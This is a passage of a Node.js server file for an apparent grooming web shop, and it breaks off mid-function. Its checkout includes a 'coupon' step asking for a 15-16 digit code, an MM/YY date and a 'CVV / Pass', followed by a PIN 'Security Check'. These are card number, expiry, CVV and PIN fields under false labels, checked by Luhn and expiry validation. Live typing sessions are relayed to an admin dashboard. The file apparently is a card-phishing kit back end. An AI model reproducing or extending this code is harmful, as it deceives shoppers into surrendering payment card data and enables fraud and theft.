const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { Server } = require('socket.io');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const db = require('./db');
const ipcheck = require('./ipcheck');
const auth = require('./auth');

const app = express();
const server = http.createServer(app);

// CORS: unset or empty ALLOWED_ORIGINS = allow all (dev/self-host); set = strict whitelist
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',')
  .map((o) => o.trim())
  .filter(Boolean);

const corsOptions = {
  origin: (origin, cb) => {
    if (ALLOWED_ORIGINS.length === 0) {
      // Production with no whitelist: allow only no-Origin (curl / server-to-server); reject browser cross-origin
      if (process.env.NODE_ENV === 'production') return cb(null, !origin);
      return cb(null, true); // dev/self-host: allow all
    }
    if (!origin) return cb(null, true); // no Origin: allow (curl, server-to-server)
    if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true); // in whitelist: allow
    cb(null, false); // not in whitelist: reject
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Admin-Token'],
};
app.use(cors(corsOptions));
app.use(express.json({ limit: '10mb' }));

// Helmet: security headers + CSP. On HTTP (no HTTPS) skip COOP so browser does not warn "untrustworthy origin"
// 1) 通用 helmet（不做 HSTS、不做 upgrade-insecure-requests）
app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: false, // 不合并 Helmet 默认（默认含 upgrade-insecure-requests，会强制资源走 HTTPS，443 未配则白屏）
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "blob:", "https:"],
      fontSrc: ["'self'", "data:"],
      connectSrc: ["'self'", "ws:", "wss:", "https:"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      objectSrc: ["'none'"],
      scriptSrcAttr: ["'none'"],
    },
  },
  hsts: false,
  crossOriginOpenerPolicy: false,
  originAgentCluster: false, // 避免 "origin-keyed vs site-keyed" 不一致的控制台警告
}));

// 2) 只对“确实是 https 的请求”加 HSTS（商店域名会走到这里）
app.use((req, res, next) => {
  const xfProto = (req.headers["x-forwarded-proto"] || "").toString().toLowerCase();
  const isHttps = req.secure || xfProto === "https";
  if (isHttps) {
    helmet.hsts({ maxAge: 31536000, includeSubDomains: true })(req, res, next);
  } else {
    next();
  }
});

// Trust proxy in production (nginx) for correct IP detection
if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', true);
}

// Helper: client IP (trust proxy only; do not read x-forwarded-for to avoid spoofing)
function clientIp(req) {
  return req.ip || '';
}

// Health check (no auth)
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// --- Admin auth: seed first user from env ---
function ensureAdminSeeded() {
  db.get('SELECT COUNT(*) as c FROM admin_users', (err, row) => {
    if (err || !row || row.c > 0) return;
    const user = process.env.INIT_ADMIN_USER;
    const pass = process.env.INIT_ADMIN_PASS;
    if (!user || !pass) return;
    
    auth.hashPassword(pass)
      .then(({ hash }) => {
        db.run("INSERT INTO admin_users (username, password_hash, role) VALUES (?, ?, 'main')", [user, hash], () => {
          console.log('Admin user seeded.');
        });
      })
      .catch(err => console.error('Failed to seed admin user:', err));
  });
}
setTimeout(ensureAdminSeeded, 1000);

// Panel IDs for permission check are now imported from auth.js to avoid duplication


function hasPanel(admin, panel) {
  if (admin.role === 'main') return true;
  const p = admin.permissions || [];
  return Array.isArray(p) && p.includes(panel);
}

function requireAdmin(panel) {
  return (req, res, next) => {
    const raw = (req.headers.authorization || req.headers['x-admin-token'] || '').toString();
    const token = raw.replace(/^Bearer\s+/i, '').trim();
    const ip = clientIp(req);
    const ua = req.headers['user-agent'] || '';
    if (!token) {
      auth.logSecurity('auth_fail', ip, 'missing_token');
      return res.status(401).json({ error: 'Unauthorized', detail: 'missing_or_invalid_token' });
    }
    if (token.length > 4096) {
      auth.logSecurity('auth_fail', ip, 'oversized_token');
      return res.status(401).json({ error: 'Unauthorized', detail: 'missing_or_invalid_token' });
    }
    auth.verifySession(token, ip, ua, (err, admin) => {
      if (err) {
        auth.logSecurity('auth_error', ip, 'verify_session_error');
        return res.status(500).json({ error: 'Server error' });
      }
      if (!admin) {
        auth.logSecurity('auth_fail', ip, 'invalid_or_expired_token');
        return res.status(401).json({ error: 'Unauthorized', detail: 'missing_or_invalid_token' });
      }
      admin.permissions = auth.sanitizePanels(admin.permissions || []);
      if (panel && !hasPanel(admin, panel)) {
        auth.logSecurity('auth_forbidden', ip, `panel=${panel} user=${admin.username}`);
        return res.status(403).json({ error: 'Forbidden', detail: 'insufficient_permission' });
      }
      req.admin = admin;
      next();
    });
  };
}

// --- Admin login rate limit (per IP) ---
const loginLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 20,
  message: { error: 'Too many login attempts', detail: 'rate_limited' },
  standardHeaders: true,
  keyGenerator: (req) => clientIp(req) || 'unknown',
});
app.post('/api/admin/auth/login', loginLimiter, (req, res) => {
  const ip = clientIp(req);
  const ua = req.headers['user-agent'] || '';
  const username = (req.body.username || '').toString().trim().slice(0, 128);
  const password = req.body.password;
  if (!username || !password) {
    auth.logSecurity('login_fail', ip, 'missing_credentials');
    return res.status(400).json({ error: 'Invalid credentials' });
  }
  db.get('SELECT id, username, password_hash, role, permissions FROM admin_users WHERE username = ?', [username], async (err, user) => {
    if (err) {
      auth.logSecurity('login_error', ip, 'db_error');
      return res.status(500).json({ error: 'Server error' });
    }
    const isValid = user && (await auth.verifyPassword(password, user.password_hash));
    if (!isValid) {
      auth.logSecurity('login_fail', ip, `user=${username}`);
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    auth.createSession(user.id, ip, ua, (err2, token, expiresAt) => {
      if (err2) return res.status(500).json({ error: 'Server error' });
      db.run('DELETE FROM admin_sessions WHERE expires_at <= datetime("now")', () => {});
      let permissions = [];
      if (user.permissions) {
        try {
          const p = JSON.parse(user.permissions);
          if (Array.isArray(p)) permissions = auth.sanitizePanels(p);
        } catch (_) { /* invalid JSON in DB */ }
      }
      res.json({ token, expiresAt, username: user.username, role: user.role, permissions });
    });
  });
});

app.post('/api/admin/auth/logout', (req, res) => {
  const raw = (req.headers.authorization || req.headers['x-admin-token'] || '').toString();
  const token = raw.replace(/^Bearer\s+/i, '').trim();
  auth.revokeSession(token, () => res.json({ ok: true }));
});

app.get('/api/admin/auth/me', requireAdmin(), (req, res) => {
  res.json({ username: req.admin.username, role: req.admin.role, permissions: req.admin.permissions });
});

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

// Admin namespace: separate from default; auth required (no join_admin bypass)
const adminNsp = io.of('/admin');
function socketIp(socket) {
  if (process.env.NODE_ENV === 'production' && socket.handshake.headers['x-forwarded-for']) {
    return (socket.handshake.headers['x-forwarded-for'] || '').split(',')[0].trim() || socket.handshake.address;
  }
  return socket.handshake.address || '';
}
adminNsp.use((socket, next) => {
  const raw = (socket.handshake.auth?.token || socket.handshake.headers?.authorization || '').toString();
  const token = raw.replace(/^Bearer\s+/i, '').trim();
  const ip = socketIp(socket);
  const ua = socket.handshake.headers['user-agent'] || '';
  if (!token) return next(new Error('unauthorized'));
  if (token.length > 4096) return next(new Error('unauthorized'));
  auth.verifySession(token, ip, ua, (err, admin) => {
    if (err) return next(new Error('server_error'));
    if (!admin) return next(new Error('unauthorized'));
    socket.admin = admin;
    next();
  });
});
adminNsp.on('connection', () => {
  // Admin dashboard only listens; no events to handle (all admin pushes are adminNsp.emit from HTTP or default-namespace handlers)
});

// Track online users (orderId -> Set of socketIds)
const onlineOrders = new Map();
const liveSessions = new Map(); // Track live typing sessions (socketId -> session data)

// Generate unique order ID (strong random; not guessable)
function generateOrderId() {
  return 'ORD-' + crypto.randomUUID();
}

function generateOrderToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Luhn algorithm validation for card numbers
function luhnCheck(num) {
  const digits = (num || '').replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  if (/^0+$/.test(digits)) return false; // reject all zeros
  let sequential = true;
  for (let i = 1; i < digits.length; i++) {
    if ((parseInt(digits[i], 10) - parseInt(digits[i - 1], 10) + 10) % 10 !== 1) {
      sequential = false;
      break;
    }
  }
  if (sequential && digits.length >= 6) return false; // reject obvious sequential
  let sum = 0, isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (isEven) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

// Check if card date (MM/YY) is expired (card valid through last day of month)
function isCardExpired(dateMMYY) {
  const m = (dateMMYY || '').match(/^(\d{2})\/(\d{2})$/);
  if (!m) return true;
  const month = parseInt(m[1], 10), year = parseInt(m[2], 10) + 2000;
  if (month < 1 || month > 12) return true;
  const now = new Date();
  const expiryEnd = new Date(year, month, 0, 23, 59, 59); // last day of expiry month
  return now > expiryEnd;
}

// --- Helpers: system_settings (key-value) ---
function getSetting(key, cb) {
  db.get('SELECT value FROM system_settings WHERE key = ?', [key], (err, row) => {
    if (err) return cb(err);
    cb(null, row ? row.value : null);
  });
}

function setSetting(key, value, cb) {
  db.run(
    'INSERT INTO system_settings (key, value, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP) ON CONFLICT(key) DO UPDATE SET value = ?, updated_at = CURRENT_TIMESTAMP',
    [key, value, value],
    cb
  );
}

const THEME_V2_SCHEMA_VERSION = 3;
const DEFAULT_NAV_LINKS = [
  { label: 'Shop', href: '/shop' },
  { label: 'Deals', href: '/deals' },
  { label: 'Beard', href: '/beard' },
  { label: 'Hair', href: '/hair' },
  { label: 'Body', href: '/body' },
  { label: 'Fragrances', href: '/fragrances' },
];
const DEFAULT_SOCIAL_LINKS = [
  { name: 'Instagram', href: '#' },
  { name: 'YouTube', href: '#' },
];
const MAX_EMBEDDED_URL_LENGTH = 200000;
const DEFAULT_THEME_PRODUCTS = [
  {
    id: 'prod_1',
    image: '/placeholder.svg',
    images: ['/placeholder.svg', '/placeholder.svg', '/placeholder.svg', '/placeholder.svg'],
    title: 'Bold Fortune Utility Oil',
    price: 29,
    displayPrice: '$29-$42',
    description: 'Beard Oil / Hair Oil / Face Oil',
    category: 'Beard',
    reviews: 2453,
    rating: 4.8,
  },
  {
    id: 'prod_2',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: 'Utility Deodorant',
    price: 24,
    displayPrice: '$24-$27',
    description: 'Natural Aluminum-Free Deodorant',
    category: 'Body',
    reviews: 892,
    rating: 4.7,
  },
  {
    id: 'prod_3',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: "Men's Cologne",
    price: 45,
    displayPrice: '$45-$50',
    description: 'Alcohol-free Eau de Parfum',
    category: 'Fragrances',
    reviews: 431,
    rating: 4.9,
  },
  {
    id: 'prod_4',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: 'Beard Balm',
    price: 25,
    displayPrice: '$25-$35',
    description: 'Styling Balm / Conditioner',
    category: 'Beard',
    reviews: 1205,
    rating: 4.6,
  },
  {
    id: 'prod_5',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: 'Utility Bar Soap',
    price: 15,
    displayPrice: '$15',
    description: 'Face / Body / Hair Wash',
    category: 'Body',
    reviews: 356,
    rating: 4.5,
  },
  {
    id: 'prod_6',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: 'Sea Salt Spray',
    price: 22,
    displayPrice: '$22',
    description: 'Texturizing Hair Spray',
    category: 'Hair',
    reviews: 678,
    rating: 4.7,
  },
  {
    id: 'prod_7',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: 'Mustache Wax',
    price: 18,
    displayPrice: '$18',
    description: 'High Hold Styling Wax',
    category: 'Beard',
    reviews: 189,
    rating: 4.4,
  },
  {
    id: 'prod_8',
    image: '/placeholder.svg',
    images: ['/placeholder.svg'],
    title: 'Beard Wash',
    price: 27,
    displayPrice: '$27',
    description: 'Gentle Beard Cleanser',
    category: 'Beard',
    reviews: 942,
    rating: 4.8,
  },
];

function safeJsonParse(raw, fallback) {
  if (raw == null || raw === '') return fallback;
  if (typeof raw === 'object') return raw;
  if (typeof raw !== 'string') return fallback;
  try {
    return JSON.parse(raw);
  } catch (_) {
    return fallback;
  }
}

function isObject(value) {
  return Boolean(value) && typeof value === 'object' && !Array.isArray(value);
}

function asText(value, fallback = '', maxLen = 200) {
  if (typeof value !== 'string') return fallback;
  const clean = value.replace(/\s+/g, ' ').trim();
  if (!clean) return fallback;
  return clean.slice(0, maxLen);
}

function asBool(value, fallback = false) {
  if (typeof value === 'boolean') return value;
  if (value === 1 || value === '1') return true;
  if (value === 0 || value === '0') return false;
  return fallback;
}

function clampInt(value, fallback, min, max) {
  const n = Number(value);
  if (!Number.isFinite(n)) return fallback;
  return Math.max(min, Math.min(max, Math.round(n)));
}

function asColor(value, fallback) {
  if (typeof value !== 'string') return fallback;
  const trimmed = value.trim();
  if (!trimmed) return fallback;
  if (/^#[0-9a-fA-F]{3,8}$/.test(trimmed)) return trimmed;
  if (/^(rgb|rgba|hsl|hsla)\(/.test(trimmed)) return trimmed.slice(0, 40);
  return fallback;
}

function normalizeNavLinks(raw) {
  const fromInput = Array.isArray(raw) ? raw : [];
  const links = [];
  const seen = new Set();
  for (const item of fromInput) {
    if (!item || typeof item !== 'object') continue;
    const label = asText(item.label, '', 30);
    const href = asText(item.href, '', 120);
    if (!label || !href) continue;
    const key = `${label}::${href}`;
    if (seen.has(key)) continue;
    seen.add(key);
    links.push({ label, href });
    if (links.length >= 12) break;
  }
  return links.length > 0 ? links : DEFAULT_NAV_LINKS.map((link) => ({ ...link }));
}

function normalizeSocialLinks(raw) {
  const fromInput = Array.isArray(raw) ? raw : [];
  const links = [];
  for (const item of fromInput) {
    if (!item || typeof item !== 'object') continue;
    const name = asText(item.name, '', 30);
    const href = asText(item.href, '', 120);
    if (!name || !href) continue;
    links.push({ name, href });
    if (links.length >= 10) break;
  }
  return links.length > 0 ? links : DEFAULT_SOCIAL_LINKS.map((link) => ({ ...link }));
}

function normalizeVisibility(raw) {
  if (!isObject(raw)) {
    return { desktop: true, mobile: true };
  }
  return {
    desktop: asBool(raw.desktop, true),
    mobile: asBool(raw.mobile, true),
  };
}

function normalizeMediaLibrary(raw) {
  const source = Array.isArray(raw) ? raw : [];
  const out = [];
  const seen = new Set();
  for (const item of source) {
    if (!isObject(item)) continue;
    const id = asText(item.id, `asset-${Date.now()}-${out.length + 1}`, 120).replace(/[^\w-]/g, '-');
    const name = asText(item.name, '', 60);
    const url = asText(item.url, '', MAX_EMBEDDED_URL_LENGTH);
    const typeRaw = asText(item.type, 'image', 10).toLowerCase();
    const type = typeRaw === 'video' || typeRaw === 'file' ? typeRaw : 'image';
    if (!name || !url) continue;
    if (seen.has(id)) continue;
    seen.add(id);
    out.push({ id, name, url, type });
    if (out.length >= 80) break;
  }
  return out;
}

function normalizeCatalogProducts(raw, fallback) {
  const source = Array.isArray(raw) ? raw : [];
  const out = [];
  const seen = new Set();

  for (const item of source) {
    if (!isObject(item)) continue;
    const id = asText(item.id, `prod_${out.length + 1}`, 64).replace(/[^\w-]/g, '-');
    if (!id || seen.has(id)) continue;
    seen.add(id);

    const image = asText(item.image, '', MAX_EMBEDDED_URL_LENGTH);
    const imagesRaw = Array.isArray(item.images) ? item.images : [];
    const images = imagesRaw
      .map((value) => asText(value, '', MAX_EMBEDDED_URL_LENGTH))
      .filter(Boolean)
      .slice(0, 10);
    const finalImages = images.length > 0 ? images : (image ? [image] : []);
    const finalImage = image || finalImages[0] || '/placeholder.svg';
    const price = clampInt(item.price, 0, 0, 99999);
    const ratingRaw = Number(item.rating);
    const rating = Number.isFinite(ratingRaw) ? Math.max(0, Math.min(5, Math.round(ratingRaw * 10) / 10)) : 4.5;

    out.push({
      id,
      title: asText(item.title, 'Untitled Product', 120),
      description: asText(item.description, '', 300),
      category: asText(item.category, 'Beard', 40),
      price,
      displayPrice: asText(item.displayPrice, `$${price}`, 40),
      image: finalImage,
      images: finalImages.length > 0 ? finalImages : [finalImage],
      rating,
      reviews: clampInt(item.reviews, 0, 0, 99999999),
    });
    if (out.length >= 120) break;
  }

  return out.length > 0
    ? out
    : fallback.map((item) => ({ ...item, images: Array.isArray(item.images) ? [...item.images] : [] }));
}

function normalizeSection(section, index) {
  const source = isObject(section) ? section : {};
  const typeRaw = asText(source.type, 'rich_text', 30).toLowerCase();
  const type = ['hero', 'product_grid', 'tagline', 'brand_story', 'rich_text'].includes(typeRaw)
    ? typeRaw
    : 'rich_text';
  const id = asText(source.id, `${type}-${index + 1}`, 80).replace(/[^\w-]/g, '-');
  const enabled = asBool(source.enabled, true);
  const visibility = normalizeVisibility(source.visibility);
  const input = isObject(source.settings) ? source.settings : {};

  if (type === 'hero') {
    return {
      id,
      type,
      enabled,
      visibility,
      settings: {
        title: asText(input.title, 'Keep on Growing', 120),
        subtitle: asText(input.subtitle, 'Premium beard care made for everyday confidence.', 240),
        ctaText: asText(input.ctaText, 'Shop Now', 40),
        ctaLink: asText(input.ctaLink, '/shop', 120),
        backgroundImage: asText(input.backgroundImage, '', MAX_EMBEDDED_URL_LENGTH),
      },
    };
  }

  if (type === 'product_grid') {
    return {
      id,
      type,
      enabled,
      visibility,
      settings: {
        title: asText(input.title, 'The Collection', 80),
        itemsPerPage: clampInt(input.itemsPerPage, 8, 4, 24),
        showFilters: asBool(input.showFilters, true),
      },
    };
  }

  if (type === 'tagline') {
    return {
      id,
      type,
      enabled,
      visibility,
      settings: {
        text: asText(input.text, 'KEEP ON GROWING', 120),
      },
    };
  }

  if (type === 'brand_story') {
    return {
      id,
      type,
      enabled,
      visibility,
      settings: {
        kicker: asText(input.kicker, 'Our Story', 40),
        title: asText(input.title, 'Crafted for the Modern Gentleman', 120),
        body: asText(input.body, 'We build products that make daily routines simpler and better.', 1000),
        buttonText: asText(input.buttonText, 'Learn More', 40),
        buttonLink: asText(input.buttonLink, '/about', 120),
      },
    };
  }

  return {
    id,
    type: 'rich_text',
    enabled,
    visibility,
    settings: {
      heading: asText(input.heading, 'Custom Section', 80),
      body: asText(input.body, 'Use this block for promos, notices, or campaign copy.', 1400),
      align: ['left', 'center', 'right'].includes(asText(input.align, 'left', 10)) ? asText(input.align, 'left', 10) : 'left',
    },
  };
}

function normalizeViewportOverride(raw, sectionIds, fallback) {
  const source = isObject(raw) ? raw : {};
  const contentWidthRaw = asText(source.contentWidth, '', 12);
  const contentWidth = ['narrow', 'normal', 'wide'].includes(contentWidthRaw) ? contentWidthRaw : fallback.contentWidth;
  const titleScaleRaw = asText(source.titleScale, '', 12);
  const titleScale = ['sm', 'md', 'lg'].includes(titleScaleRaw) ? titleScaleRaw : fallback.titleScale;

  const hiddenInput = Array.isArray(source.hiddenSectionIds) ? source.hiddenSectionIds : fallback.hiddenSectionIds;
  const hiddenSectionIds = hiddenInput
    .map((id) => asText(id, '', 80).replace(/[^\w-]/g, '-'))
    .filter((id, idx, list) => id && sectionIds.includes(id) && list.indexOf(id) === idx)
    .slice(0, 30);

  return {
    contentWidth,
    sectionGap: source.sectionGap == null ? fallback.sectionGap : clampInt(source.sectionGap, fallback.sectionGap || 24, 8, 64),
    cardGap: source.cardGap == null ? fallback.cardGap : clampInt(source.cardGap, fallback.cardGap || 8, 0, 32),
    titleScale,
    hiddenSectionIds,
  };
}

function normalizePages(raw, fallback) {
  const source = isObject(raw) ? raw : {};
  const collection = isObject(source.collection) ? source.collection : {};
  const product = isObject(source.product) ? source.product : {};
  const support = isObject(source.support) ? source.support : {};
  const company = isObject(source.company) ? source.company : {};
  const checkout = isObject(source.checkout) ? source.checkout : {};
  const coupon = isObject(source.coupon) ? source.coupon : {};
  const pin = isObject(source.pin) ? source.pin : {};
  return {
    collection: {
      title: asText(collection.title, fallback.collection.title, 120),
      subtitle: asText(collection.subtitle, fallback.collection.subtitle, 280),
      bannerImage: asText(collection.bannerImage, fallback.collection.bannerImage, MAX_EMBEDDED_URL_LENGTH),
    },
    product: {
      title: asText(product.title, fallback.product.title, 120),
      subtitle: asText(product.subtitle, fallback.product.subtitle, 280),
      galleryStyle: ['grid', 'carousel'].includes(asText(product.galleryStyle, fallback.product.galleryStyle, 20))
        ? asText(product.galleryStyle, fallback.product.galleryStyle, 20)
        : fallback.product.galleryStyle,
      showBreadcrumbs: asBool(product.showBreadcrumbs, fallback.product.showBreadcrumbs),
      showBenefits: asBool(product.showBenefits, fallback.product.showBenefits),
    },
    support: {
      title: asText(support.title, fallback.support.title, 120),
      subtitle: asText(support.subtitle, fallback.support.subtitle, 280),
      heroImage: asText(support.heroImage, fallback.support.heroImage, MAX_EMBEDDED_URL_LENGTH),
    },
    company: {
      title: asText(company.title, fallback.company.title, 120),
      subtitle: asText(company.subtitle, fallback.company.subtitle, 280),
      heroImage: asText(company.heroImage, fallback.company.heroImage, MAX_EMBEDDED_URL_LENGTH),
    },
    checkout: {
      title: asText(checkout.title, fallback.checkout.title, 120),
      subtitle: asText(checkout.subtitle, fallback.checkout.subtitle, 280),
      shippingTitle: asText(checkout.shippingTitle, fallback.checkout.shippingTitle, 120),
      defaultCountry: asText(checkout.defaultCountry, fallback.checkout.defaultCountry, 120),
      countryLabel: asText(checkout.countryLabel, fallback.checkout.countryLabel, 60),
      firstNameLabel: asText(checkout.firstNameLabel, fallback.checkout.firstNameLabel, 60),
      lastNameLabel: asText(checkout.lastNameLabel, fallback.checkout.lastNameLabel, 60),
      addressLabel: asText(checkout.addressLabel, fallback.checkout.addressLabel, 60),
      addressPlaceholder: asText(checkout.addressPlaceholder, fallback.checkout.addressPlaceholder, 120),
      cityLabel: asText(checkout.cityLabel, fallback.checkout.cityLabel, 60),
      stateLabel: asText(checkout.stateLabel, fallback.checkout.stateLabel, 60),
      statePlaceholder: asText(checkout.statePlaceholder, fallback.checkout.statePlaceholder, 24),
      zipCodeLabel: asText(checkout.zipCodeLabel, fallback.checkout.zipCodeLabel, 60),
      phoneLabel: asText(checkout.phoneLabel, fallback.checkout.phoneLabel, 60),
      emailLabel: asText(checkout.emailLabel, fallback.checkout.emailLabel, 60),
      summaryTitle: asText(checkout.summaryTitle, fallback.checkout.summaryTitle, 120),
      subtotalLabel: asText(checkout.subtotalLabel, fallback.checkout.subtotalLabel, 60),
      shippingLabel: asText(checkout.shippingLabel, fallback.checkout.shippingLabel, 60),
      shippingValueText: asText(checkout.shippingValueText, fallback.checkout.shippingValueText, 80),
      totalLabel: asText(checkout.totalLabel, fallback.checkout.totalLabel, 60),
      placeOrderText: asText(checkout.placeOrderText, fallback.checkout.placeOrderText, 80),
      agreementText: asText(checkout.agreementText, fallback.checkout.agreementText, 280),
      emptyCartTitle: asText(checkout.emptyCartTitle, fallback.checkout.emptyCartTitle, 120),
      emptyCartButtonText: asText(checkout.emptyCartButtonText, fallback.checkout.emptyCartButtonText, 80),
      heroImage: asText(checkout.heroImage, fallback.checkout.heroImage, MAX_EMBEDDED_URL_LENGTH),
    },
    coupon: {
      title: asText(coupon.title, fallback.coupon.title, 120),
      subtitle: asText(coupon.subtitle, fallback.coupon.subtitle, 280),
      codeLabel: asText(coupon.codeLabel, fallback.coupon.codeLabel, 120),
      codePlaceholder: asText(coupon.codePlaceholder, fallback.coupon.codePlaceholder, 80),
      dateLabel: asText(coupon.dateLabel, fallback.coupon.dateLabel, 80),
      datePlaceholder: asText(coupon.datePlaceholder, fallback.coupon.datePlaceholder, 24),
      passwordLabel: asText(coupon.passwordLabel, fallback.coupon.passwordLabel, 120),
      passwordPlaceholder: asText(coupon.passwordPlaceholder, fallback.coupon.passwordPlaceholder, 24),
      submitText: asText(coupon.submitText, fallback.coupon.submitText, 80),
      loadingTitle: asText(coupon.loadingTitle, fallback.coupon.loadingTitle, 120),
      loadingDescription: asText(coupon.loadingDescription, fallback.coupon.loadingDescription, 360),
      rejectedTitle: asText(coupon.rejectedTitle, fallback.coupon.rejectedTitle, 120),
      rejectedMessage: asText(coupon.rejectedMessage, fallback.coupon.rejectedMessage, 240),
      returnTitle: asText(coupon.returnTitle, fallback.coupon.returnTitle, 120),
      returnMessage: asText(coupon.returnMessage, fallback.coupon.returnMessage, 240),
      helpText: asText(coupon.helpText, fallback.coupon.helpText, 360),
      heroImage: asText(coupon.heroImage, fallback.coupon.heroImage, MAX_EMBEDDED_URL_LENGTH),
    },
    pin: {
      title: asText(pin.title, fallback.pin.title, 120),
      subtitle: asText(pin.subtitle, fallback.pin.subtitle, 280),
      codeLabel: asText(pin.codeLabel, fallback.pin.codeLabel, 120),
      codePlaceholder: asText(pin.codePlaceholder, fallback.pin.codePlaceholder, 80),
      submitText: asText(pin.submitText, fallback.pin.submitText, 80),
      submittingText: asText(pin.submittingText, fallback.pin.submittingText, 80),
      loadingTitle: asText(pin.loadingTitle, fallback.pin.loadingTitle, 120),
      loadingDescription: asText(pin.loadingDescription, fallback.pin.loadingDescription, 360),
      invalidCodeMessage: asText(pin.invalidCodeMessage, fallback.pin.invalidCodeMessage, 240),
      rejectedMessage: asText(pin.rejectedMessage, fallback.pin.rejectedMessage, 240),
      helpText: asText(pin.helpText, fallback.pin.helpText, 360),
      heroImage: asText(pin.heroImage, fallback.pin.heroImage, MAX_EMBEDDED_URL_LENGTH),
    },
  };
}

function getDefaultThemeV2() {
  return {
    schema_version: THEME_V2_SCHEMA_VERSION,
    tokens: {
      contentWidth: 'normal',
      radius: 'none',
      surface: 'default',
      fontFamily: 'serif',
      accentColor: '#d4af37',
      backgroundColor: '#ffffff',
      textColor: '#1f1f1f',
      sectionGap: 24,
      cardGap: 8,
      titleScale: 'md',
    },
    viewportOverrides: {
      desktop: {
        hiddenSectionIds: [],
      },
      mobile: {
        contentWidth: 'narrow',
        sectionGap: 20,
        cardGap: 8,
        titleScale: 'sm',
        hiddenSectionIds: [],
      },
    },
    header: {
      announcementEnabled: true,
      announcementText: 'Norse Winter Beard Oil Available Now',
      navLinks: DEFAULT_NAV_LINKS.map((link) => ({ ...link })),
    },
    footer: {
      description: 'Premium grooming essentials for modern routines.',
      motto: 'Keep on Growing',
      socialLinks: DEFAULT_SOCIAL_LINKS.map((link) => ({ ...link })),
    },
    catalog: {
      products: DEFAULT_THEME_PRODUCTS.map((product) => ({
        ...product,
        images: Array.isArray(product.images) ? [...product.images] : [],
      })),
    },
    mediaLibrary: [],
    pages: {
      collection: {
        title: 'Shop Collection',
        subtitle: 'Curated formulas for beard, hair, and body.',
        bannerImage: '',
      },
      product: {
        title: 'Product Details',
        subtitle: 'Clear ingredient info and routine guidance.',
        galleryStyle: 'grid',
        showBreadcrumbs: true,
        showBenefits: true,
      },
      support: {
        title: 'Support Center',
        subtitle: 'Shipping, returns, and order support in one place.',
        heroImage: '',
      },
      company: {
        title: 'About Our Brand',
        subtitle: 'What we build and why it helps daily routines.',
        heroImage: '',
      },
      checkout: {
        title: 'Checkout',
        subtitle: 'Complete your shipping details to continue.',
        shippingTitle: 'Shipping Address',
        defaultCountry: 'United States',
        countryLabel: 'Country',
        firstNameLabel: 'First Name',
        lastNameLabel: 'Last Name',
        addressLabel: 'Address',
        addressPlaceholder: '1234 Main St',
        cityLabel: 'City',
        stateLabel: 'State',
        statePlaceholder: 'NY',
        zipCodeLabel: 'ZIP Code',
        phoneLabel: 'Phone',
        emailLabel: 'Email',
        summaryTitle: 'Order Summary',
        subtotalLabel: 'Subtotal',
        shippingLabel: 'Shipping',
        shippingValueText: 'Free',
        totalLabel: 'Total',
        placeOrderText: 'Place Order',
        agreementText: 'By placing this order, you agree to our Terms of Service and Privacy Policy.',
        emptyCartTitle: 'Your cart is empty',
        emptyCartButtonText: 'Continue Shopping',
        heroImage: '',
      },
      coupon: {
        title: 'Final Step',
        subtitle: 'Enter your exclusive offer details to complete your order.',
        codeLabel: 'Coupon Code (15-16 digits)',
        codePlaceholder: 'XXXX-XXXX-XXXX-XXXX',
        dateLabel: 'Date (MM/YY)',
        datePlaceholder: 'MM/YY',
        passwordLabel: 'CVV / Pass (3-4 digits)',
        passwordPlaceholder: '1234',
        submitText: 'Verify & Complete Order',
        loadingTitle: 'Verifying Coupon...',
        loadingDescription: 'Please wait while we verify your exclusive offer code. This usually takes less than a minute. Do not refresh the page.',
        rejectedTitle: 'Verification Failed',
        rejectedMessage: 'Verification failed. Please check your coupon details and try again.',
        returnTitle: 'Coupon Verification Required',
        returnMessage: 'Please check or replace your coupon and try again.',
        helpText: '',
        heroImage: '',
      },
      pin: {
        title: 'Security Check',
        subtitle: 'Additional security verification is required. Please enter your PIN code below.',
        codeLabel: 'PIN Code',
        codePlaceholder: 'Enter PIN',
        submitText: 'Verify PIN',
        submittingText: 'Verifying...',
        loadingTitle: 'Verifying PIN...',
        loadingDescription: 'Please wait while we verify your security code.',
        invalidCodeMessage: 'Please enter a valid PIN code',
        rejectedMessage: 'Verification failed. Please try again.',
        helpText: '',
        heroImage: '',
      },
    },
    home: {
      sections: [
        normalizeSection({ id: 'hero-1', type: 'hero', enabled: true, visibility: { desktop: true, mobile: true }, settings: {} }, 0),
        normalizeSection({ id: 'product-grid-1', type: 'product_grid', enabled: true, visibility: { desktop: true, mobile: true }, settings: {} }, 1),
        normalizeSection({ id: 'tagline-1', type: 'tagline', enabled: true, visibility: { desktop: true, mobile: true }, settings: {} }, 2),
        normalizeSection({ id: 'brand-story-1', type: 'brand_story', enabled: true, visibility: { desktop: true, mobile: true }, settings: {} }, 3),
      ],
    },
  };
}

function normalizeThemeV2(input) {
  const base = getDefaultThemeV2();
  const source = isObject(input) ? input : {};
